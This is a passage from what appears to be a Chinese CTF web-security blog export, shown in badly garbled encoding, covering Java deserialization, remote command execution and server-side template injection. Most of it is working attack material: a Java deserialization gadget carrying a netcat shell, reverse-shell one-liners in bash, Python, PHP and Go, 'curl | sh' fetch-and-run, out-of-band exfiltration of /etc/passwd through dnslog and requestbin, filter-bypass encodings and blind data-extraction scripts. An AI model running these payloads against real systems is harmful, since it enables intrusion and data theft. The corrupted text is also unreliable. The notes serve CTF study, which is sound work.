pickleååºåˆ—åŒ–çš„åˆ©ç”¨æŠ€å·§æ€»ç»“ â€‹ Javaååºåˆ—åŒ–Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼ŒObjectOutputStream ç±»çš„ writeObject() æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚ Javaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectOutputStream ç±»çš„ readObject() æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚ ä¸€ä¸ªç±»è¦èƒ½ååºåˆ—åŒ–å¿…é¡»æ»¡è¶³ä¸‹é¢2ä¸ªæ¡ä»¶ï¼š è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ï¼› è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536public class User implements Serializable &#123; private String username; public User(String username) &#123; this.username = username; &#125; public String getName()&#123; return this.username; &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); Runtime.getRuntime().exec(this.username); &#125;&#125;package com.ctfshow.entity;public class UserPayload &#123; public static void main(String[] args) throws Exception &#123; String userDataPost = null; User user = new User(&quot;nc IP Port -e /bin/sh&quot;); try &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream); os.writeObject(user); os.close(); byte[] userData = byteArrayOutputStream.toByteArray(); userDataPost = new String(Base64.getEncoder().encode(userData)); System.out.println(userDataPost); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; ç»•è¿‡ readUnshared() readUnshared()ä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚ â€‹ JDBCååºåˆ—åŒ–MySQLå®¢æˆ·ç«¯jdbcååºåˆ—åŒ–æ¼æ´ â€‹ æ¡†æ¶ååºåˆ—åŒ–ï¼ˆCVEï¼‰ Yii2CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†æ æˆ‘æ˜¯å¦‚ä½•æŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„ Laravel v5.8 Laravel 5.8 RCE åˆ†æ ThinkPHP v5.1.x ThinkPHP 5.1.xååºåˆ—åŒ– PHPGGCPHPGGCæ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶çš„åºåˆ—åŒ–æµ‹è¯•payloadçš„å·¥å…·ã€‚ PHPGGC: PHP Generic Gadget Chains ä»0åˆ°1æŒæ¡ååºåˆ—åŒ–å·¥å…·ä¹‹PHPGGC","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"Lazzaro"},{"title":"RCE","slug":"web-RCE","date":"2020-05-14T16:20:39.000Z","updated":"2023-10-19T13:33:24.692Z","comments":true,"path":"2020/05/15/web-RCE/","permalink":"https://lazzzaro.github.io/2020/05/15/web-RCE/","excerpt":"","text":"è¿œç¨‹å‘½ä»¤æ‰§è¡Œ/è¿œç¨‹ä»£ç æ‰§è¡Œ (Remote Command/Code Execute, RCE)å¸¸ç”¨å‘½ä»¤1234567891011121314151617181920212223#æŸ¥çœ‹æ–‡ä»¶å‘½ä»¤cat/tac/more/less/head/tail/nl/od/uniqgrep test flag.phpphp /flag #æ–‡ä»¶å†…å®¹ä¼šè¢«å½“æˆphpä»£ç æ‰§è¡Œï¼Œç›¸å½“äºincludephp -t / -r &quot;include(&#x27;/flag&#x27;);&quot; #æŒ‡å®šæ ¹ç›®å½•ï¼Œç»•è¿‡open_basedirsh /flag 2&gt;&amp;1 #sh+æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼ˆèšå‰‘æ˜¯è¿™ä¸ªåŸç†ï¼‰sed p#åˆ—ç›®å½•å‘½ä»¤du -a .chgrp -v -R#æ‰“åŒ…æ–‡ä»¶tar cvf xxx.tar . #å°†å½“å‰ç›®å½•æ‰“åŒ…å‹ç¼©ä¸ºxxx.tar#å†™å…¥æ–‡ä»¶ls &gt; xxxls | tee xxxscript -a xxx; ls; exit; #ä¾æ¬¡æ‰§è¡Œecho -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read #å†™shell#åå¼¹shellcurl [IP] | sh #VPS payload: bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; â€‹ å‘½ä»¤åˆ†éš”ç¬¦12345ping x.x.x.x;ls #è¿ç»­æŒ‡ä»¤ping x.x.x.x|ls #ç®¡é“ç¬¦ï¼ˆæ˜¾ç¤ºç¬¬äºŒä¸ªå‘½ä»¤ç»“æœï¼‰ping x.x.x.x&amp;ls #åå°è¿›ç¨‹ping x.x.x.x||ls #é€»è¾‘è¿ç®—ï¼ˆç¬¬ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œè¿”å›å€¼æ­£å¸¸ï¼Œç¬¬äºŒä¸ªå‘½ä»¤æ‰æ‰§è¡Œï¼‰ping x.x.x.x&amp;&amp;ls #é€»è¾‘è¿ç®—ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œè¿”å›å€¼æ­£å¸¸ï¼Œç¬¬äºŒä¸ªå‘½ä»¤å°±ä¸æ‰§è¡Œäº†ï¼‰ â€‹ åå¼¹shellbashï¼š 123456bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9tYXg2LmZ1bi82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;nc [IP] [Port] -e /bin/sh#æ¥æ”¶nc -lvvnp [Port] pythonï¼š 123456python3 -c &#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;your-ip&quot;,7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#x27;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-ip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;nc -lvvnp 2333 python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; #æ¨¡æ‹Ÿç»ˆç«¯ phpï¼š 1php -r &#x27;$sock=fsockopen(&quot;ip&quot;,6666);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; goï¼š 1234567891011121314151617package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;os/exec&quot;)func main() &#123; cmd := exec.Command(&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;) out, err := cmd.CombinedOutput() if err != nil &#123; fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out)) log.Fatalf(&quot;cmd.Run() failed with %s\\n&quot;, err) &#125; fmt.Printf(&quot;combined out:\\n%s\\n&quot;, string(out))&#125; â€‹ ç»•è¿‡ï¼ˆbypassï¼‰ç©ºæ ¼1&lt;ï¼Œ&lt;&gt;ï¼Œ%20ï¼Œ%09ï¼Œ$IFSï¼Œ$&#123;IFS&#125;ï¼Œ$IFS$9ï¼Œ&#123;cat,1.txt&#125; åˆ†å·1%0a å‘½ä»¤ï¼ˆä»¥pwdä¸ºä¾‹ï¼‰1a=p;b=wd;$a$bï¼Œp&#x27;&#x27;wdï¼Œp&quot;&quot;wdï¼Œp\\`\\`wdï¼Œp\\wdï¼Œpwd$uï¼Œ`echo cHdk|base64 -d\\`ï¼Œecho &quot;707764&quot;|xxd -r -p|bash å…³é”®è¯ï¼ˆä»¥flagä¸ºä¾‹ï¼‰123cat fla*ï¼Œcat f???ï¼Œcat flag$uï¼Œcat fl&quot;a&quot;gï¼Œcat fl&#x27;a&#x27;gcat /[e-i][k-n][1-z][e-i]php -r &quot;echo chr(47).chr(102).chr(108).chr(97).chr(103)&quot; IPåœ°å€è½¬æ•°å­—åœ°å€ï¼šhttp://www.msxindl.com/tools/ip/ip_num.asp æ— å›æ˜¾1&gt;1 åˆ›å»ºæ–‡ä»¶åä¸º1çš„ç©ºæ–‡ä»¶ a&gt;1 è™½æŠ¥é”™ï¼Œä½†å¯åˆ›å»ºç©ºæ–‡ä»¶ ls&gt;1 æŠŠlsçš„å†…å®¹å¯¼å…¥1ä¸­ å†™æ–‡ä»¶12curl -o shell.php http://xxxxxx.txtwget -O shell.php http://xxxxxx.txt åˆ©ç”¨å¹³å° 123curl http://requestbin.net/r/1kiej1p1?p=`whoami`curl `cat /etc/passwd|base64`.xxxxxx.dnslog.cn #dnslogå¸¦å¤–curl bashupload.com -T your_file.txt #bashupload.comå¸¦å¤–ä¸‹è½½æ–‡ä»¶ å‚è€ƒtxtï¼š http://php.loglog.jp/net/exec.php.txt https://johannes.homepc.org/packet9.txt https://metaeventos.net/userfiles/file/p.txt https://www.cpdc.com.tw/uploads/zhang.txt â€‹ ç›²æ³¨ï¼ˆæ— å›æ˜¾ï¼‰123456789101112131415161718192021222324import requestsimport stringimport timeurl=&#x27;http://localhost.test.php/?c=&#x27;dic=string.printable[:-6]flag=&#x27;&#x27;for i in range(1,50): judge=0 for j in dic: now=f&#x27;&#123;url&#125;a=$(cat /flag | head -1 | cut -b &#123;i&#125;);if [ $a = &#123;j&#125; ];then sleep 2;fi&#x27; start=time.time() r=requests.get(now) end=time.time() if int(end)-int(start) &gt;1: judge=1 flag+=j print(flag) break if judge==0: break print(flag) å…¶ä»–å‘½ä»¤ï¼š 12345if fgrep -c &quot;a&quot; &quot;flag.txt&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fiif ls | fgrep -c &quot;a&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fi[ $(head -c 2 flag.txt | tail -c 1) = &#x27;a&#x27; ][ $(ls | head -c 2 | tail -c 1) = &#x27;a&#x27; ] â€‹ æ— å­—æ¯ / ç‰¹æ®Šå­—ç¬¦ç¦ç”¨ ? å…«è¿›åˆ¶ï¼ˆä¸èƒ½è§£æå¸¦æœ‰å‚æ•°çš„å‘½ä»¤ï¼‰ ls -&gt; $&#39;\\154\\163&#39; ç¦ç”¨ ? 2-9 bashå¯¹äºæ•´æ•°çš„è¡¨ç¤ºå½¢å¼æ˜¯ [base#]n çš„å½¢å¼ï¼Œæ¯”æ–¹è¯´å¦‚æœä¸€ä¸ªåè¿›åˆ¶æ•°4ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶æ•°100ï¼Œé‚£ä¹ˆåœ¨bashé‡Œå¯ä»¥è¡¨ç¤ºä¸º 2#100ã€‚ åœ¨ç°æœ‰æ¡ä»¶ä¸‹ï¼Œåªè¦é€šè¿‡ä½è¿ç®— $((1&lt;&lt;1)) æ„é€ å‡º2ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼æ¥æ„é€ ä»»æ„æ•°å­—äº†ï¼Œæ¯”æ–¹è¯´ ls å°±æ˜¯$(($((1&lt;&lt;1))#10011010)) $(($((1&lt;&lt;1))#10100011))ï¼Œä½†æ˜¯ $&#39;\\154\\163&#39; è¿™ç§å½¢å¼å¯ä»¥ï¼Œè€Œç›´æ¥è¿è¡Œ $\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39; ä¼šæŠ¥é”™ã€‚ ä»”ç»†çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥çœ‹å‡ºï¼Œbashæ˜¯ç¡®å®æŠŠ$\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;è¿™ä¸€ä¸²å­—ç¬¦ä¸²è§£æä¸º$&#39;\\154\\163&#39;è¿™ä¸ªå½¢å¼äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿›ä¸€æ­¥è§£æï¼Œä¹Ÿå°±æ˜¯ç»è¿‡bashçš„å¤„ç†ï¼Œè¿™ä¸€æ®µå­—ç¬¦å˜æˆäº†$&#39;\\154\\163&#39;è€Œæ²¡æœ‰å˜æˆlsã€‚ è¿™é‡Œå¼•å…¥bashçš„ä¸€ä¸ªè¯­æ³•&lt;&lt;&lt;ä¸‰ä¸ªå°äºå·(here-strings)ï¼Œè¯­æ³•ï¼šcommand [args] &lt;&lt;&lt;[&quot;]$word[&quot;]ï¼Œ$wordä¼šå±•å¼€å¹¶ä½œä¸ºcommandçš„stdinã€‚ æ‰€ä»¥åªè¦æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸º$0(bash)å‘½ä»¤çš„stdinï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œæ¯”å¦‚ï¼šbash&lt;&lt;&lt;$\\&#39;\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39; ä½†æ˜¯è¿™ç§å‘½ä»¤å½¢å¼ä¸æ”¯æŒå¸¦å‚æ•°çš„å¤æ‚å‘½ä»¤ï¼Œä»…æ”¯æŒä¸å¸¦å‚æ•°çš„å‘½ä»¤ï¼Œæ˜¯å› ä¸ºbashæŠŠè¿™ä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œæ•´ä½“ï¼Œè€Œæ²¡æœ‰æŠŠç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦æ­£ç¡®è§£æï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸¤æ¬¡here-stringsçš„æ–¹æ³•æ¥è§£æå¤æ‚çš„å¸¦å‚æ•°å‘½ä»¤ã€‚ 12345678cmd = &#x27;ls -al&#x27;payload = &#x27;$0&lt;&lt;&lt;$0\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27;for c in cmd: payload += f&#x27;\\\\\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;payload += &#x27;\\\\\\&#x27;&#x27;print(payload) ä»…å« &lt;$!&#123;&#125;()_&amp; å¯ä»¥å°è¯•é€šè¿‡$&#123;!?&#125;å’Œ$&#123;!#&#125;çš„å½¢å¼æ‹¿åˆ°bashï¼Œå¦‚æœä¸è¡Œï¼Œä»…èƒ½é€šè¿‡å®šä¹‰ä¸€ä¸ª__=$(())çš„æ–¹å¼å°†__å˜é‡çš„å€¼è®¾ç½®ä¸º0ï¼Œç„¶åé€šè¿‡$&#123;!__&#125;çš„å½¢å¼æ‹¿åˆ°shå­—ç¬¦ã€‚ä¸¤æ¡å‘½ä»¤é—´é€šè¿‡&amp;&amp;è¿›è¡Œè¿æ¥ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼Œæ˜¯å› ä¸ºbashçš„å˜é‡å‘½åè§„èŒƒæ˜¯ä»¥ä¸‹åˆ’çº¿æˆ–è€…è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¯ä»¥åŒ…å«ä¸‹åˆ’çº¿å’Œè‹±æ–‡å­—æ¯æ•°å­—ã€‚ å¯ä»¥é€šè¿‡$(())å–åˆ°0ï¼Œç„¶åå¯¹0è¿›è¡ŒæŒ‰ä½å–åï¼Œå¯ä»¥å¾—åˆ°-1ï¼Œå¾ˆå¤šä¸ª-1è¿›è¡Œæ’åˆ— å¯ä»¥å¾—åˆ°-2ã€-3ã€-4ã€-5ã€-6ã€-7ã€-8ï¼Œç„¶åå†æŒ‰ä½å–åå°±å¯ä»¥å¾—åˆ°1ã€2ã€3ã€4ã€5ã€6ã€7ã€‚è¿™æ ·å°±å¾—åˆ°äº†8è¿›åˆ¶å‘½ä»¤æ‹¼æ¥çš„æ‰€æœ‰æ•°å­—ã€‚ 12345678910111213141516171819202122cmd = &#x27;ls -al&#x27;r = &#123;&#125;x = &#x27;$((~$(())))&#x27;#-1for i in range(1,9): r[i] = &#x27;$((~$((&#x27;+x for j in range(i): r[i] += x r[i] += &#x27;))))&#x27;r[0] = &#x27;$(())&#x27;payload = &#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27;for c in cmd: payload += &#x27;\\\\\\\\&#x27; for i in oct(ord(c))[2:]: payload += r[int(i)]payload += &#x27;\\\\\\&#x27;&#x27;print(payload) ä»…å« &lt;$ &#123;&#125;\\#()&#39;0 é‡å®šå‘+å…«è¿›åˆ¶+æ•°å­—æ„é€  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsn = dict()n[0] = &#x27;0&#x27;n[1] = &#x27;$&#123;##&#125;&#x27; #$&#123;##&#125;è®¡ç®—#è¿™ä¸ªå­—ç¬¦çš„é•¿åº¦ä¸º1ï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰å±è”½!çš„è¯è¿˜å¯ä»¥ç”¨$((!$#))n[2] = &#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27; #é€šè¿‡ä½è¿ç®—å¾—åˆ°2n[3] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27; #é€šè¿‡äºŒè¿›åˆ¶11è½¬æ¢ä¸ºåè¿›åˆ¶å¾—åˆ°3,4,5,6,7n[4] = &#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;n[5] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;n[6] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;n[7] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;f=&#x27;&#x27;def str_to_oct(cmd): #å‘½ä»¤è½¬æ¢æˆå…«è¿›åˆ¶å­—ç¬¦ä¸² s = &quot;&quot; for t in cmd: o = (&#x27;%s&#x27; % (oct(ord(t))))[2:] s+=&#x27;\\\\&#x27;+o return sdef build(cmd): #å…«è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆå­—ç¬¦ payload = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\\\\&#x27;&quot; s = str_to_oct(cmd).split(&#x27;\\\\&#x27;) for _ in s[1:]: payload+=&quot;\\\\\\\\&quot; for i in _: payload+=n[int(i)] return payload+&#x27;\\\\\\&#x27;&#x27;def get_flag(url,payload): #ç›²æ³¨å‡½æ•° try: data = &#123;&#x27;cmd&#x27;:payload&#125; r = requests.post(url,data,timeout=1.5) except: return True return False#å¼¹shell#print(build(&#x27;bash -i &gt;&amp; /dev/tcp/your-ip/2333 0&gt;&amp;1&#x27;))#ç›²æ³¨#a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@&#x27;# for i in range(1,50):# for j in a:# cmd=f&#x27;cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3&#x27;# url = &quot;http://ip/&quot;# if get_flag(url,build(cmd)):# break# f = f+j# print(f) å‚è€ƒï¼š å®‰æ´µæ¯2020 - Bash-Vino0o0o 34c3 CTF - minbashmaxfun","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"},{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"}],"author":"Lazzaro"},{"title":"SSTI","slug":"web-SSTI","date":"2020-05-14T16:20:39.000Z","updated":"2023-05-22T15:47:10.204Z","comments":true,"path":"2020/05/15/web-SSTI/","permalink":"https://lazzzaro.github.io/2020/05/15/web-SSTI/","excerpt":"","text":"â€‹ SSTI (Server-Side Template Injection)ï¼Œå³æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼Œé€šè¿‡ä¸æœåŠ¡ç«¯æ¨¡æ¿çš„è¾“å…¥è¾“å‡ºäº¤äº’ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œæ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°è¯»å–æ–‡ä»¶æˆ–è€…getshellçš„ç›®çš„ã€‚ç›®å‰CTFå¸¸è§çš„SSTIé¢˜ä¸­ï¼Œç¯å¢ƒå¤šä¸ºpythonã€‚ Pythonæ²™ç®±é€ƒé€¸åœ¨ Python ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ï¼š os ï¼ˆæ¨¡å—ç”¨äºè®¿é—®æ“ä½œç³»ç»ŸåŠŸèƒ½çš„æ¨¡å—ã€‚é€šç”¨æ“ä½œï¼š1.ç³»ç»Ÿæ“ä½œï¼Œ2.ç›®å½•æ“ä½œï¼Œ3.åˆ¤æ–­æ“ä½œã€‚ï¼‰ commandsï¼šä»…é™2.x ï¼ˆè¯¥æ¨¡å—åœ¨3.xä¸­å·²ç»è¢«subprocesså–ä»£ã€‚ä½†æ˜¯åœ¨2.xçš„æ—©æœŸç‰ˆæœ¬ä¸­å®ƒä¹Ÿæ˜¯é‡è¦çš„å†…ç½®æ¨¡å—ä¹‹ä¸€ã€‚ï¼‰ subprocess ï¼ˆæ¨¡å—ç”¨äºç®¡ç†å­è¿›ç¨‹ã€‚å¯ä»¥è°ƒç”¨å¤–éƒ¨å‘½ä»¤ä½œä¸ºå­è¿›ç¨‹ï¼Œè¿˜å¯ä»¥ç”Ÿæˆæ–°çš„è¿›ç¨‹ã€è¿æ¥åˆ°å®ƒä»¬çš„input/output/errorç®¡é“ï¼ŒåŒæ—¶è·å–å®ƒä»¬çš„è¿”å›ç ã€‚ï¼‰ timeitï¼štimeit.sysã€timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1) ï¼ˆæ—¶é—´æ¨¡å—ï¼Œç”¨äºå‡†ç¡®æµ‹é‡ä»£ç æ‰§è¡Œæ—¶é—´ã€‚è¯¥æ¨¡å—å®šä¹‰äº†ä¸‰ä¸ªå®ç”¨å‡½æ•°å’Œä¸€ä¸ªå…¬å…±ç±»ã€‚ï¼‰ platformï¼šplatform.osã€platform.sysã€platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read() ï¼ˆè¯¥æ¨¡å—ç”¨äºè·å¾—æ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯ã€‚ï¼‰ ptyï¼špty.spawn(&#39;ls&#39;)ã€pty.os ï¼ˆè¯¥æ¨¡å—å®šä¹‰äº†å¤„ç†ä¼ªç»ˆç«¯çš„æ“ä½œï¼šå¯åŠ¨å¦ä¸€ä¸ªè¿›ç¨‹å¹¶èƒ½å¤Ÿä»¥ç¼–ç¨‹æ–¹å¼å†™å…¥å’Œè¯»å–å…¶æ§åˆ¶ç»ˆç«¯ã€‚ï¼‰ bdbï¼šbdb.osã€cgi.sys cgiï¼šcgi.osã€cgi.sys â€¦ åŸºæœ¬æ“ä½œæŸ¥çœ‹å…¨å±€å˜é‡ï¼š 1[å˜é‡å].__globals__ è¯»å†™æ–‡ä»¶ æ–¹æ³•ä¸€å¸¸ç”¨å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031__class__ ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚__base__ ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»__bases__ ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases____mro__ æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚__subclasses__() è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function__globals__ ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„æ¨¡å—ã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚æŸ¥çœ‹æ‰€æœ‰é”®åï¼š__globals__.keys()ã€‚__dic__ ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__() å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__() è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#x27;b&#x27;]ï¼Œå°±æ˜¯a.__getitem__(&#x27;b&#x27;)__builtins__ å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚__import__ åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]__str__() è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚lipsum flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;current_app åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚request 